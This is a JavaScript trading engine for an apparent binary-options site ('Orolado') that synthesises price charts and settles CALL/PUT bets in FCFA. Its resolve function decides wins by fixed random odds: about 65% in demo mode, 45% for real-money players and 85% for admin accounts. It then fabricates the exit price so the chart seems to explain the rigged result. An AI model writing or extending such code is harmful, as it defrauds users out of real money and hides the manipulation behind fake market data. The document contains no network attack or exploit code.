(function (D6) {
  'use strict';

  var C = D6.CONFIG;
  var markets = {};
  var trades = [];
  var payoutLive = {};
  var lastOrderAt = 0;
  var sessionNonce = D6.uid();
  var orderSeq = 0;
  // Max 2 trades ouverts simultanés par compte.
  var MAX_OPEN = (C.MAX_OPEN || 2);
  var CANDLE_MS = 1000;
  var HISTORY_SEC = 240;
  var synthCache = {};

  function u32(n) {
    n = Math.imul(n ^ (n >>> 16), 2246822507);
    n = Math.imul(n ^ (n >>> 13), 3266489909);
    return (n ^ (n >>> 16)) >>> 0;
  }

  function uhash01(i, salt) {
    return u32(Math.imul(i | 0, 374761393) ^ Math.imul(salt | 0, 668265263)) / 4294967296;
  }

  function valueNoise(t, salt) {
    var i = Math.floor(t);
    var f = t - i;
    var u = f * f * (3 - 2 * f);
    return uhash01(i, salt) * (1 - u) + uhash01(i + 1, salt) * u;
  }

  // Profils indépendants : seed + vol + dérive + spikes (pas le même tableau + offset).
  function feedProfile(assetId) {
    switch (assetId) {
      case 'stable':
        return { salt: 221713, vol: 0.14, drift: 0, f1: 0.019, f2: 0.041, f3: 0.007, a1: 6, a2: 3.5, a3: 8, spike: null };
      case 'v75':
        return { salt: 551903, vol: 0.62, drift: 0, f1: 0.033, f2: 0.071, f3: 0.014, a1: 14, a2: 9, a3: 22, spike: null };
      case 'crash300':
        return { salt: 771001, vol: 0.9, drift: -0.018, f1: 0.028, f2: 0.066, f3: 0.011, a1: 12, a2: 8, a3: 18, spike: 'down' };
      case 'boom300':
        return { salt: 882119, vol: 0.9, drift: 0.018, f1: 0.031, f2: 0.069, f3: 0.012, a1: 12, a2: 8, a3: 18, spike: 'up' };
      case 'v100':
      default:
        return { salt: 904177, vol: 1.05, drift: 0, f1: 0.041, f2: 0.093, f3: 0.017, a1: 18, a2: 11, a3: 32, spike: null };
    }
  }

  function spikeAt(t, salt, dir) {
    var period = dir === 'down' ? 9.5 : 10.5;
    var epoch = Math.floor(t / period);
    var roll = uhash01(epoch, salt + (dir === 'down' ? 17 : 31));
    if (roll < 0.78) return 0;
    var phase = (t - epoch * period) / period;
    var amp = 28 + uhash01(epoch, salt + 99) * 55;
    var shape = phase < 0.22
      ? Math.sin((phase / 0.22) * Math.PI)
      : Math.max(0, 1 - (phase - 0.22) / 0.55) * 0.35;
    return (dir === 'down' ? -1 : 1) * amp * shape;
  }

  function synthPrice(asset, tSec) {
    var id = asset.id || asset;
    var conf = typeof asset === 'object' ? asset : (C.ASSETS[id] || { id: id, basePrice: 10000 });
    var p = feedProfile(conf.id);
    var t = Number(tSec) || 0;
    var wave = Math.sin(t * p.f1) * p.a1
      + Math.cos(t * p.f2) * p.a2
      + Math.sin(t * p.f3) * p.a3;
    var n = (valueNoise(t, p.salt) - 0.5) * 16
      + (valueNoise(t * 2.17, p.salt + 41) - 0.5) * 7
      + (valueNoise(t * 8.3, p.salt + 113) - 0.5) * 2.4;
    var spike = p.spike ? spikeAt(t, p.salt, p.spike) : 0;
    return conf.basePrice + (wave + n) * p.vol + spike + p.drift * (t % 86400) * 0.04;
  }

  function candleForBucket(asset, bucket) {
    var start = bucket * CANDLE_MS;
    var o = synthPrice(asset, start / 1000);
    var h = o;
    var l = o;
    var c = o;
    var k;
    for (k = 1; k <= 4; k++) {
      var p = synthPrice(asset, (start + k * 200) / 1000);
      if (p > h) h = p;
      if (p < l) l = p;
      c = p;
    }
    return { o: o, h: h, l: l, c: c, t: start };
  }

  function formingCandle(asset, nowMs) {
    var bucket = Math.floor(nowMs / CANDLE_MS);
    var start = bucket * CANDLE_MS;
    var o = synthPrice(asset, start / 1000);
    var h = o;
    var l = o;
    var c = synthPrice(asset, nowMs / 1000);
    var elapsed = nowMs - start;
    var k;
    var steps = Math.max(1, Math.min(5, Math.floor(elapsed / 200) + 1));
    for (k = 1; k < steps; k++) {
      var p = synthPrice(asset, (start + k * 200) / 1000);
      if (p > h) h = p;
      if (p < l) l = p;
    }
    h = Math.max(h, c);
    l = Math.min(l, c);
    return { o: o, h: h, l: l, c: c, t: start };
  }

  function rebuildHistory(asset, nowMs) {
    var bucket = Math.floor(nowMs / CANDLE_MS);
    var start = bucket - HISTORY_SEC + 1;
    var candles = [];
    var history = [];
    var i;
    var b;
    var c;
    for (i = 0; i < HISTORY_SEC - 1; i++) {
      b = start + i;
      c = candleForBucket(asset, b);
      candles.push(c);
      history.push(c.c);
    }
    var forming = formingCandle(asset, nowMs);
    history.push(forming.c);
    return { candles: candles, forming: forming, history: history, to: bucket - 1 };
  }

  function syncMarket(market, asset, nowMs) {
    nowMs = nowMs || Date.now();
    var bucket = Math.floor(nowMs / CANDLE_MS);
    var st = synthCache[asset.id];
    if (!st || st.to !== bucket - 1) {
      if (st && st.to === bucket - 2 && st.candles && st.candles.length) {
        var done = candleForBucket(asset, bucket - 1);
        st.candles.push(done);
        if (st.candles.length > HISTORY_SEC - 1) st.candles.shift();
        st.to = bucket - 1;
      } else {
        st = rebuildHistory(asset, nowMs);
        synthCache[asset.id] = st;
      }
    }
    var forming = formingCandle(asset, nowMs);
    var history = st.history || [];
    history.length = 0;
    var hi;
    for (hi = 0; hi < st.candles.length; hi++) history.push(st.candles[hi].c);
    history.push(forming.c);
    st.history = history;
    market.price = forming.c;
    market.candles = st.candles;
    market.candle = forming;
    market.history = history;
    market.ticksInCandle = Math.floor((nowMs % CANDLE_MS) / 80);
    return market;
  }

  function seedMarket(assetId) {
    var asset = C.ASSETS[assetId];
    var market = {
      id: assetId,
      price: asset.basePrice,
      history: [],
      candles: [],
      candle: { o: asset.basePrice, h: asset.basePrice, l: asset.basePrice, c: asset.basePrice },
      ticksInCandle: 0,
      payout: C.REAL_PAYOUT
    };
    return syncMarket(market, asset, Date.now());
  }

  function rollPayout(asset, mode) {
    if (mode === 'real') return C.REAL_PAYOUT;
    var span = asset.payoutMax - asset.payoutMin;
    return +(asset.payoutMin + Math.random() * span).toFixed(3);
  }

  function ensureMarkets() {
    var id;
    for (id in C.ASSETS) {
      if (!markets[id]) markets[id] = seedMarket(id);
    }
  }

  function makeSeal(payload) {
    var s = sessionNonce + '|' + payload + '|' + orderSeq;
    var h = 2166136261;
    var i;
    for (i = 0; i < s.length; i++) {
      h ^= s.charCodeAt(i);
      h = Math.imul(h, 16777619);
    }
    return (h >>> 0).toString(16);
  }

  function automationDetected() {
    if (navigator.webdriver) return true;
    if (window.callPhantom || window._phantom) return true;
    if (window.domAutomation || window.domAutomationController) return true;
    return false;
  }

  function balOf(user, mode) {
    if (D6.Store.balanceMode) return D6.Store.balanceMode(user, mode);
    return D6.Store.balanceOf(user);
  }

  function setBal(user, mode, value) {
    if (D6.Store.setBalanceMode) D6.Store.setBalanceMode(user, mode, value);
    else {
      var prev = user.mode;
      user.mode = mode;
      D6.Store.setBalance(user, value);
      user.mode = prev;
    }
  }

  function stakeCap(user, stake, mode) {
    mode = mode || user.mode;
    var balance = balOf(user, mode);
    if (stake < C.MIN_STAKE) {
      return { ok: false, cap: C.MIN_STAKE, reason: D6.I18N.t('minStake') + ' ' + D6.fmtFCFA(C.MIN_STAKE) };
    }
    if (stake > balance) {
      return { ok: false, cap: balance, reason: D6.I18N.t('insufficient') };
    }
    return { ok: true, cap: balance };
  }

  function expiryOf(t) {
    return t.expiryTime || t.expiresAt;
  }

  function isLive(t) {
    return t && !t.settled && t.status === 'open' && Date.now() < expiryOf(t);
  }

  function isOpen(t) {
    return t && !t.settled && (t.status === 'open' || !t.status);
  }

  function openForMode(mode) {
    return trades.filter(function (t) {
      return isOpen(t) && t.mode === mode;
    });
  }

  function syncTime(t) {
    var left = (expiryOf(t) - Date.now()) / 1000;
    t.timeLeft = left > 0 ? left : 0;
    return t.timeLeft;
  }

  function publicTrade(t) {
    if (!t) return null;
    syncTime(t);
    return Object.freeze({
      id: t.id,
      assetId: t.assetId,
      side: t.side,
      stake: t.stake,
      duration: t.duration,
      timeLeft: t.timeLeft,
      entryPrice: t.entryPrice,
      openPrice: t.entryPrice,
      payout: t.payout,
      payoutMult: t.payout,
      startedAt: t.startedAt,
      startTime: t.startTime || t.startedAt,
      openedAt: t.startTime || t.startedAt,
      expiryTime: expiryOf(t),
      expiresAt: expiryOf(t),
      expiryAt: expiryOf(t),
      settled: !!t.settled,
      status: t.status || (t.settled ? 'closed' : 'open'),
      mode: t.mode,
      accountType: t.mode
    });
  }

  function persistOpen(user) {
    if (!user) return;
    user.openTrades = trades.filter(isOpen).map(function (t) {
      return {
        id: t.id,
        userId: t.userId,
        assetId: t.assetId,
        side: t.side,
        stake: t.stake,
        payout: t.payout,
        entryPrice: t.entryPrice,
        duration: t.duration,
        durationMs: t.durationMs,
        startTime: t.startTime,
        startedAt: t.startedAt,
        expiryTime: expiryOf(t),
        expiresAt: expiryOf(t),
        mode: t.mode,
        status: 'open',
        settled: false,
        seq: t.seq
      };
    });
    D6.Store.saveUser(user);
  }

  function closePriceAt(assetId, expiryMs) {
    var asset = C.ASSETS[assetId];
    if (!asset) return 0;
    return synthPrice(asset, expiryMs / 1000);
  }

  ensureMarkets();
  Object.keys(C.ASSETS).forEach(function (id) {
    payoutLive[id] = markets[id].payout;
  });

  var api = {
    markets: markets,
    payoutLive: payoutLive,
    onExpire: null,
    onSettled: null,

    getMarket: function (id) {
      ensureMarkets();
      return markets[id];
    },

    getTrade: function () {
      var live = trades.filter(isLive);
      if (!live.length) return null;
      var best = live[0];
      var i;
      for (i = 1; i < live.length; i++) {
        if (expiryOf(live[i]) < expiryOf(best)) best = live[i];
      }
      return publicTrade(best);
    },

    getTrades: function (mode) {
      return trades.filter(isLive).filter(function (t) {
        return !mode || t.mode === mode;
      }).map(function (t) { return publicTrade(t); });
    },

    liveCount: function (mode) {
      if (mode) return openForMode(mode).length;
      return trades.filter(isOpen).length;
    },

    restoreOpen: function (user) {
      if (!user) return 0;
      trades = [];
      var list = user.openTrades || [];
      var i;
      for (i = 0; i < list.length; i++) {
        var raw = list[i];
        if (!raw || !raw.id) continue;
        if (raw.userId && raw.userId !== user.id) continue;
        if (raw.settled || raw.status === 'won' || raw.status === 'lost' || raw.status === 'void') continue;
        trades.push({
          id: raw.id,
          assetId: C.ASSETS[raw.assetId] ? raw.assetId : 'v100',
          side: raw.side === 'put' ? 'put' : 'call',
          stake: Math.floor(Number(raw.stake) || 0),
          duration: raw.duration || 10,
          durationMs: raw.durationMs || (raw.duration || 10) * 1000,
          timeLeft: 0,
          entryPrice: Number(raw.entryPrice) || 0,
          payout: Number(raw.payout) || C.REAL_PAYOUT,
          startTime: raw.startTime || raw.startedAt || Date.now(),
          startedAt: raw.startedAt || raw.startTime || Date.now(),
          expiryTime: raw.expiryTime || raw.expiresAt || raw.expiryAt,
          expiresAt: raw.expiresAt || raw.expiryTime || raw.expiryAt,
          mode: raw.mode === 'real' ? 'real' : 'demo',
          userId: user.id,
          seq: raw.seq || 0,
          settled: false,
          status: 'open'
        });
      }
      if (D6.Chart && D6.Chart.applyOpenTradeVisual) {
        for (i = 0; i < trades.length; i++) {
          try { D6.Chart.applyOpenTradeVisual(publicTrade(trades[i])); } catch (eR) { /* ignore */ }
        }
      }
      return trades.length;
    },

    refreshPayout: function (assetId, mode) {
      var asset = C.ASSETS[assetId];
      var u = D6.Store.current();
      var m = mode || (u && u.mode) || 'demo';
      payoutLive[assetId] = rollPayout(asset, m);
      markets[assetId].payout = payoutLive[assetId];
      return payoutLive[assetId];
    },

    tick: function (assetId) {
      ensureMarkets();
      var now = Date.now();
      var i;
      for (i = 0; i < trades.length; i++) {
        syncTime(trades[i]);
      }
      var id;
      for (id in C.ASSETS) {
        if (C.ASSETS.hasOwnProperty(id)) {
          syncMarket(markets[id], C.ASSETS[id], now);
        }
      }
    },

    placeOrder: function (user, opts) {
      if (automationDetected()) return { ok: false, reason: 'Session non sécurisée' };
      if (!user || !D6.Store.current() || D6.Store.current().id !== user.id) {
        return { ok: false, reason: 'Session invalide' };
      }
      var mode = user.mode === 'real' ? 'real' : 'demo';
      if (openForMode(mode).length >= MAX_OPEN) {
        return { ok: false, reason: D6.I18N.t('maxPositions') };
      }

      var nowPerf = performance.now();
      if (nowPerf - lastOrderAt < C.MIN_ORDER_MS) {
        return { ok: false, reason: D6.I18N.t('antibot') };
      }

      var stake = Math.floor(Number(opts.stake) || 0);
      var duration = C.DURATIONS.indexOf(opts.duration) >= 0 ? opts.duration : C.DEFAULT_DURATION;
      var assetId = C.ASSETS[opts.assetId] ? opts.assetId : 'v100';
      var side = opts.side === 'put' ? 'put' : 'call';
      var gate = stakeCap(user, stake, mode);
      if (!gate.ok) return gate;

      ensureMarkets();
      var market = markets[assetId];
      var payout = mode === 'real' ? C.REAL_PAYOUT : (payoutLive[assetId] || rollPayout(C.ASSETS[assetId], 'demo'));
      setBal(user, mode, balOf(user, mode) - stake);
      D6.Store.addTransaction(user, {
        type: 'stake',
        amount: -stake,
        mode: mode,
        note: (side === 'call' ? 'CALL' : 'PUT') + ' ' + C.ASSETS[assetId].short
      });

      orderSeq += 1;
      lastOrderAt = nowPerf;
      D6.holdRemote = true;
      var entry = market.price;
      var wall = Date.now();
      var durationMs = duration * 1000;
      var id = D6.uid();

      var t = {
        id: id,
        assetId: assetId,
        side: side,
        stake: stake,
        duration: duration,
        durationMs: durationMs,
        timeLeft: duration,
        entryPrice: entry,
        payout: payout,
        startTime: wall,
        startedAt: wall,
        expiryTime: wall + durationMs,
        expiresAt: wall + durationMs,
        mode: mode,
        userId: user.id,
        seq: orderSeq,
        settled: false,
        status: 'open'
      };
      trades.push(t);

      if (mode === 'real') {
        user.realStakeVolume = (user.realStakeVolume || 0) + stake;
      }
      user.lastStake = stake;
      persistOpen(user);
      if (D6.Supabase && D6.Supabase.saveOrder) D6.Supabase.saveOrder(t, 'open');
      var pub = publicTrade(t);
      // Ligne CALL/PUT immédiate (sync) — ne pas attendre le prochain tick/F5.
      if (D6.Chart && D6.Chart.applyOpenTradeVisual) {
        try { D6.Chart.applyOpenTradeVisual(pub); } catch (eVis) { /* ignore */ }
      }
      return { ok: true, trade: pub };
    },

    resolve: function (user, tradeId) {
      if (!user || !trades.length) return null;
      var idx = -1;
      var i;
      var now = Date.now();
      if (tradeId) {
        for (i = 0; i < trades.length; i++) {
          if (trades[i].id === tradeId) { idx = i; break; }
        }
      } else {
        for (i = 0; i < trades.length; i++) {
          if (isOpen(trades[i]) && now >= expiryOf(trades[i])) { idx = i; break; }
        }
      }
      if (idx < 0) return null;
      var trade = trades[idx];
      if (trade.settled || trade.status === 'won' || trade.status === 'lost' || trade.status === 'void') {
        trades.splice(idx, 1);
        persistOpen(user);
        if (D6.Chart && D6.Chart.removeTradeVisual) {
          try { D6.Chart.removeTradeVisual(trade.id); } catch (e0) { /* ignore */ }
        }
        return null;
      }
      if (now < expiryOf(trade)) return null;

      // Idempotence : marquer avant crédit.
      trade.settled = true;
      if (D6.Chart && D6.Chart.removeTradeVisual) {
        try { D6.Chart.removeTradeVisual(trade.id); } catch (e1) { /* ignore */ }
      }

      if (user.id !== trade.userId) {
        trades.splice(idx, 1);
        persistOpen(user);
        return null;
      }

      var mode = trade.mode === 'real' ? 'real' : 'demo';
      var isCall = trade.side === 'call';
      var expMs = expiryOf(trade);
      var exitPrice = closePriceAt(trade.assetId, expMs);
      var voided = false;
      var won;
      var isAdminUser = !!(user.role === 'admin' || (user.email && String(user.email).toLowerCase() === String((C.ADMIN_EMAIL || 'admin@orolado.com')).toLowerCase()));
      // Démo ~65 %. Réel admin ~85 %. Réel joueur ~45 %.
      if (mode === 'demo') {
        var pWin = C.DEMO_WIN_RATE != null ? C.DEMO_WIN_RATE : 0.65;
        won = Math.random() < pWin;
      } else if (isAdminUser) {
        won = Math.random() < (C.ADMIN_WIN_RATE != null ? C.ADMIN_WIN_RATE : 0.85);
      } else {
        won = Math.random() < (C.REAL_WIN_RATE != null ? C.REAL_WIN_RATE : 0.45);
      }
      var nudge = Math.max((C.ASSETS[trade.assetId].tickNoise || 0.3) * 0.45, 0.28);
      exitPrice = trade.entryPrice + (won
        ? (isCall ? 1 : -1)
        : (isCall ? -1 : 1)) * nudge;
      var payoutAmount = 0;
      var net = 0;
      var status = 'lost';

      if (voided) {
        status = 'void';
        payoutAmount = trade.stake;
        setBal(user, mode, balOf(user, mode) + trade.stake);
        net = 0;
        D6.Store.addTransaction(user, {
          type: 'void',
          amount: trade.stake,
          mode: mode,
          note: 'Égalité — mise rendue ' + C.ASSETS[trade.assetId].short
        });
      } else if (won) {
        status = 'won';
        payoutAmount = Math.floor(trade.stake * trade.payout);
        setBal(user, mode, balOf(user, mode) + payoutAmount);
        net = payoutAmount - trade.stake;
        user.wins = (user.wins || 0) + 1;
        user.consecutiveWins = (user.consecutiveWins || 0) + 1;
        user.consecutiveLosses = 0;
        user.lastLost = false;
        D6.Store.addTransaction(user, {
          type: 'win',
          amount: payoutAmount,
          mode: mode,
          note: 'Position gagnante ' + C.ASSETS[trade.assetId].short
        });
      } else {
        status = 'lost';
        net = -trade.stake;
        user.consecutiveLosses = (user.consecutiveLosses || 0) + 1;
        user.consecutiveWins = 0;
        user.lastLost = true;
        D6.Store.addTransaction(user, {
          type: 'loss',
          amount: -trade.stake,
          mode: mode,
          note: 'Position expirée ' + C.ASSETS[trade.assetId].short
        });
      }

      trade.status = status;
      trade.closePrice = exitPrice;
      trade.exitPrice = exitPrice;

      user.trades = (user.trades || 0) + 1;
      if (mode === 'real') user.realTrades = (user.realTrades || 0) + 1;
      else user.demoTrades = (user.demoTrades || 0) + 1;
      user.recentResults.unshift({ won: won, mode: mode, voided: voided });
      if (user.recentResults.length > 30) user.recentResults.length = 30;

      var position = {
        id: trade.id,
        at: D6.nowIso(),
        clock: D6.clock(),
        assetId: trade.assetId,
        assetName: C.ASSETS[trade.assetId].short,
        side: trade.side,
        stake: trade.stake,
        payout: trade.payout,
        entryPrice: trade.entryPrice,
        exitPrice: exitPrice,
        closePrice: exitPrice,
        duration: trade.duration,
        won: won,
        voided: voided,
        status: status,
        net: net,
        mode: mode,
        accountType: mode
      };
      D6.Store.addPosition(user, position);
      trades.splice(idx, 1);
      persistOpen(user);
      if (D6.Supabase && D6.Supabase.saveOrder) {
        D6.Supabase.saveOrder({
          id: trade.id,
          assetId: trade.assetId,
          side: trade.side,
          stake: trade.stake,
          duration: trade.duration,
          mode: mode,
          payout: trade.payout,
          entryPrice: trade.entryPrice,
          exitPrice: exitPrice,
          won: won,
          voided: voided,
          status: status,
          net: net
        }, 'closed');
      }

      try {
        document.dispatchEvent(new CustomEvent('orolado-trade-settled', {
          detail: { isWin: won, voided: voided, payout: payoutAmount, net: net, tradeId: trade.id }
        }));
      } catch (e) { /* ignore */ }

      var closed = publicTrade(trade);
      if (!trades.filter(isLive).length) D6.holdRemote = false;
      return {
        trade: closed,
        position: position,
        won: won,
        voided: voided,
        net: net,
        exitPrice: exitPrice,
        closePrice: exitPrice,
        status: status
      };
    },

    flushSettlements: function (user) {
      if (!user || !trades.length) return [];
      var now = Date.now();
      var ids = [];
      var i;
      for (i = 0; i < trades.length; i++) {
        if (isOpen(trades[i]) && now >= expiryOf(trades[i])) ids.push(trades[i].id);
      }
      var results = [];
      for (i = 0; i < ids.length; i++) {
        var res = api.resolve(user, ids[i]);
        if (res) {
          results.push(res);
          if (typeof api.onSettled === 'function') {
            try { api.onSettled(res); } catch (e) { /* ignore */ }
          }
        }
      }
      return results;
    },

    maxStakeHint: function (user) {
      var probe = stakeCap(user, Number.MAX_SAFE_INTEGER, user && user.mode);
      return probe.cap;
    }
  };

  D6.Synth = {
    price: synthPrice,
    candleMs: CANDLE_MS,
    closeAt: closePriceAt
  };

  D6.Engine = api;
  try {
    Object.defineProperty(D6, 'Engine', { configurable: false, writable: false, value: api });
  } catch (e) { /* ignore */ }
})(window.D6 = window.D6 || {});
